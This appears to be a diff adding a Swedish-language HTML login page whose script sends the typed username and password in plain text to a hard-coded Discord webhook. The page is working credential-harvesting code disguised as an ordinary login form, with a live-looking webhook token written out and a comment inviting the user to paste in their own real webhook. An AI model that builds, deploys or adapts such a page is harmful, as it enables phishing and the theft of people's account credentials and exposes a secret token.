@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="sv">
+<head>
+  <meta charset="UTF-8">
+  <title>Login</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: #1e1e2f;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .login-box {
+      background: #2e2e40;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.5);
+      width: 300px;
+      color: #ffffff;
+    }
+
+    .login-box h2 {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .login-box label {
+      font-size: 14px;
+      display: block;
+      margin-top: 10px;
+    }
+
+    .login-box input {
+      width: 100%;
+      padding: 8px;
+      margin-top: 5px;
+      border: none;
+      border-radius: 5px;
+      background: #444;
+      color: #fff;
+    }
+
+    .login-box button {
+      margin-top: 20px;
+      width: 100%;
+      padding: 10px;
+      border: none;
+      background: #5a88fc;
+      color: white;
+      border-radius: 5px;
+      cursor: pointer;
+      font-weight: bold;
+      transition: background 0.3s ease;
+    }
+
+    .login-box button:hover {
+      background: #3f6be0;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="login-box">
+    <h2>Login</h2>
+    <form id="loginForm">
+      <label for="username">Username</label>
+      <input type="text" id="username" required>
+
+      <label for="password">Password</label>
+      <input type="password" id="password" required>
+
+      <button type="submit">Login</button>
+    </form>
+  </div>
+
+  <script>
+    const webhookURL = 'https://discord.com/api/webhooks/1386382592961413190/xlCNZeYivytcj8rSXnEyaX-u7lnaxyEpYfHKrGz1laYoLdKAXT9Jk45ITU1cJxr-clJ3'; // Lägg in din riktiga webhook-länk här
+
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+
+      const message = `🟦 **Login-försök**\n🔹 Username: ${username}\n🔸 Password: ${password}`;
+
+      fetch(webhookURL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ content: message })
+      })
+      .then(res => {
+        if (res.ok) {
+          alert('Inskickat!');
+        } else {
+          alert('Webhook-fel.');
+        }
+      });
+    });
+  </script>
+
+</body>
+</html>
